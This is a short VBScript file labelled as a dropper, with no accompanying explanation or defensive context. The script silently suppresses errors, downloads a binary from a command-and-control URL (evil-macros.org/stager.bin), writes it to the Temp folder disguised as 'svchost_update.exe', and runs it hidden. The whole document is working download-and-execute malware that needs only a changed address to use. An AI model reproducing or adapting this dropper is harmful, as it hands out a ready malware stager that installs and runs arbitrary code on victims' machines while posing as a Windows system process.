' Visual Basic Scripting Dropper
On Error Resume Next
Set wshShell = CreateObject("WScript.Shell")
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set adodbStream = CreateObject("ADODB.Stream")

c2Url = "http://evil-macros.org/stager.bin"
xmlHttp.Open "GET", c2Url, False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    adodbStream.Open
    adodbStream.Type = 1
    adodbStream.Write xmlHttp.ResponseBody
    dropPath = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost_update.exe"
    adodbStream.SaveToFile dropPath, 2
    adodbStream.Close
    wshShell.Run dropPath, 0, False
End If
